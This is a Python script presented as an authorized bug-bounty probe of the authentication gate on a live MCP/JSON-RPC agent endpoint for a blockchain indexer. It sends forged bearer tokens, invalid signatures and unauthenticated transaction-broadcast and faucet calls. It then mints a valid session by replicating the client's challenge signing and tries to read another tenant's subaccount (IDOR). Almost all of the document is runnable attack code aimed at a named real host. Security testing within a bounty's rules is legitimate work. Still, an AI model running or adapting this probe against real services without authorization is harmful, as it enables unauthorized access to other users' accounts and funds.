#!/usr/bin/env python3
"""
MCP / JSON-RPC agent auth-gate — live authorized exploit probe.

Checks whether the auth boundary can be bypassed (IDOR / forged session /
cross-tenant access) using SINGLE requests only (no DoS, no high-volume scan —
respects bounty program rules).

Worked defaults target SVP Chain `indexer.svpchain.com/mcp` (svpchain-agent,
testnet svp-2517-1). The exact `sign_challenge` replication + svp1… bech32 owner
derivation are wired in. Adapt BASE / ChallengePrefix for other agents.

CORRECT SIGNING (verified working 2026-07):
  SVP sign_challenge => Go ethsecp256k1.PrivKey.Sign(msg) which computes
  keccak256(msg) then signs => 65-byte [R||S||V] (v in {27,28}). The server's
  auth_verify uses go-ethereum crypto.SigToPub, which ACCEPTS v=27/28.
  Variants that FAILED during the live hunt:
    - sha256(msg) instead of keccak256(msg)  -> rejected (no bearer)
    - 64-byte [R||S] only (stripped v)       -> "signature must be 65 bytes (got 64)"
  Also: the server returns the token as `bearer_token` (NOT `bearer`/`token`).

Requires (operator venv): eth_account, cryptography, eth_keys, eth_utils, bech32, requests.
Run: /home/gmrid171/miningperia/venv/bin/python mcp_auth_probe.py
"""
import base64, json, re, requests
from eth_account import Account
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from eth_keys import keys
from eth_utils import keccak
from bech32 import bech32_encode, convertbits

BASE = "https://indexer.svpchain.com/mcp"
CHALLENGE_PREFIX = "svpchain-mcp-auth-v1:"


# ---------- exact client signing (mirrors svpchain-agent sign_challenge) ----------
def svp_owner(eckey):
    pub = eckey.public_key()
    pub65 = pub.public_bytes(Encoding.X962, PublicFormat.UncompressedPoint)
    addr20 = keccak(pub65)[-20:]
    return bech32_encode("svp", convertbits(list(addr20), 8, 5))


def sign_challenge(eckey, challenge):
    # Go ethsecp256k1.PrivKey.Sign(msg): digest = keccak256(msg); returns 65-byte [R||S||V].
    digest = keccak(text=challenge)
    priv = eckey.private_numbers().private_value
    sig = keys.PrivateKey(priv.to_bytes(32, "big")).sign_msg_hash(digest)  # 65-byte Signature obj
    return base64.b64encode(bytes(sig)).decode()


# ---------- transport helpers ----------
def new_session():
    r = requests.post(BASE, timeout=12, headers={
        "Content-Type": "application/json", "Accept": "application/json, text/event-stream"},
        json={"jsonrpc": "2.0", "id": 0, "method": "initialize",
              "params": {"protocolVersion": "2024-11-05", "capabilities": {},
                         "clientInfo": {"name": "probe", "version": "0.1"}}})
    sid = r.headers.get("Mcp-Session-Id")
    h = {"Content-Type": "application/json", "Accept": "application/json, text/event-stream",
         "Mcp-Session-Id": sid}
    requests.post(BASE, timeout=12, headers=h,
                  json={"jsonrpc": "2.0", "method": "notifications/initialized"})
    return h


def call(h, method, args, bearer=None):
    hh = dict(h)
    if bearer:
        hh["Authorization"] = f"Bearer {bearer}"
    r = requests.post(BASE, timeout=12, headers=hh,
                      json={"jsonrpc": "2.0", "id": 1, "method": "tools/call",
                            "params": {"name": method, "arguments": args}})
    m = re.search(r"data: (\{.*\})", r.text)
    return json.loads(m.group(1)) if m else {"raw": r.text[:200]}


def auth_as(h, pkbytes):
    eckey = ec.derive_private_key(int.from_bytes(pkbytes, "big"), ec.SECP256K1())
    owner = svp_owner(eckey)
    ch = call(h, "auth_challenge", {"owner": owner})
    if "result" not in ch:
        return owner, None, str(ch)[:160]
    txt = ch["result"]["content"][0]["text"]
    challenge = json.loads(txt)["challenge"]
    nonce = json.loads(txt)["nonce"]
    b64 = sign_challenge(eckey, challenge)
    if not b64:
        return owner, None, "sign failed"
    res = call(h, "auth_verify", {"nonce": nonce, "signature": b64})
    out = res.get("result", {}).get("content", [{}])[0].get("text", "")
    try:
        bearer = json.loads(out).get("bearer_token")
    except Exception:
        bearer = None
    return owner, out, bearer


def short(x):
    return json.dumps(x)[:200].replace("\n", " ")


# ---------- attempt matrix ----------
print("=" * 70)
print("MCP AUTH-GATE PROBE — single requests, no DoS")
print("=" * 70)

h = new_session()
print("\n[1] tools/list (no init) ->", short(call(h, "tools/list", {})))

FAKE = "fake.invalid.token.123"
for m, a in [("whoami", {}), ("faucet_claim", {}),
             ("set_transfer_out_cap", {"symbol": "usdc", "amount": "1000"}),
             ("get_subaccount", {"address": "svp1qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq", "subaccount_number": 0})]:
    print(f"[2] {m} (fake bearer) ->", short(call(h, m, a, bearer=FAKE)))

for label, sig in [("empty", ""), ("garbage", "not-a-signature"), ("random", "0x" + "ab" * 65)]:
    print(f"[3] auth_verify ({label}) ->", short(call(h, "auth_verify", {"nonce": "deadbeef", "signature": sig})))

print("[4] broadcast (no auth) ->", short(call(h, "broadcast_signed_tx",
      {"client_id": "svp1qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq", "signed_tx": "0xdeadbeef"})))

# legit handshake to show whether a valid session can be obtained
ka = Account.create().key
h2 = new_session()
owner, out, bearer = auth_as(h2, ka)
print(f"\n[5] legit handshake ({owner}) ->", short(out))
print("    bearer obtained:", bool(bearer))
if bearer:
    kb = Account.create().key
    ek_b = ec.derive_private_key(int.from_bytes(kb, "big"), ec.SECP256K1())
    OB = svp_owner(ek_b)
    print("    [6] IDOR get_subaccount(OTHER) ->", short(call(h2, "get_subaccount",
          {"address": OB, "subaccount_number": 0}, bearer=bearer)))
    print("    tenant-isolation check: expect 'owner <OTHER> not allowed for tenant <A>' if gate holds.")
else:
    print("    [6] valid session NOT established client-side -> live IDOR not reachable.")
    print("        Security result: forged/mined/mismatched-owner sigs rejected by auth_verify.")
